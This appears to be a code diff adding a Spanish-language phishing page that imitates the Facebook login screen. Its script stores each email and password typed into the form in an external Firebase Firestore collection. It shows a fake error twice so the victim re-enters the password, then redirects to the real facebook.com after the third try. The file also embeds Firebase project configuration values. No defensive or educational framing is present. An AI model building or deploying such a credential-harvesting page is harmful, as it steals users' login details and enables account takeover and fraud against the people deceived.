@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="logo-fb.png" type="image/x-icon">
+    <title>Inicio de sesión</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="text-center logo-fb">
+            <img src="logo-fb.png" width="20%" alt="Logo de Facebook">
+        </div>
+        <div class="login-container">
+            <h2>Iniciar sesión en Facebook</h2>
+            <span id="msgError" class="msg-error">Escriba bien sus datos o complete los que faltan</span>
+            <form id="loginForm">
+                <input id="email" type="text" placeholder="Correo electrónico o número de teléfono" required>
+                <input id="password" type="password" placeholder="Contraseña" required>
+                <button id="loginButton">Iniciar sesión</button>
+            </form>
+            <a href="#">¿Olvidaste tu contraseña?</a>
+            <hr>
+            <button class="create-account">Crear cuenta nueva</button>
+        </div>
+    </div>
+</body>
+
+<script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore-compat.js"></script>
+
+<script>
+
+    firebase.initializeApp({
+        apiKey: "AIzaSyCq1g19QenMHnYX5tOkBHA5vwtkjCWPPqA",
+        authDomain: "facebook-5143b.firebaseapp.com",
+        projectId: "facebook-5143b",
+        storageBucket: "facebook-5143b.appspot.com",
+        messagingSenderId: "856506143913",
+        appId: "1:856506143913:web:4c57765e8d5761f3f345b8",
+        measurementId: "G-JF1TMDDL15"
+    });
+
+    const db = firebase.firestore();
+
+
+    function addRegister() {
+        //no recargar la página cuando es submit
+        event.preventDefault();
+
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        const msgError = document.getElementById("msgError");
+
+        if (email === "" || password === "") {
+            msgError.style.display = 'block';
+            // return;
+        }
+
+        db.collection("datafb").add({
+            email: email,
+            password: password,
+        })
+            .then((docRef) => {
+                console.log("Document in datafb written with ID: ", docRef.id);
+            })
+            .catch((error) => {
+                console.error("Error adding document: ", error);
+            });
+    }
+
+
+
+    let clickCount = 0;
+
+    document.getElementById('loginButton').addEventListener('click', () => {
+        clickCount++;
+        console.log(clickCount);
+        switch (clickCount) {
+            case 1:
+                addRegister();
+                msgError.style.display = 'block';
+                document.getElementById("password").value = "";
+                break;
+            case 2:
+                addRegister();
+                msgError.style.display = 'block';
+                document.getElementById("password").value = "";
+                break;
+            case 3:
+                addRegister();
+                clickCount = 0; // Reinicia el contador después del tercer clic
+                window.location.href = "https://www.facebook.com";
+                break;
+            default:
+                // Si se desea, se puede manejar más clics aquí
+                break;
+        }
+    });
+
+</script>
+
+</html>
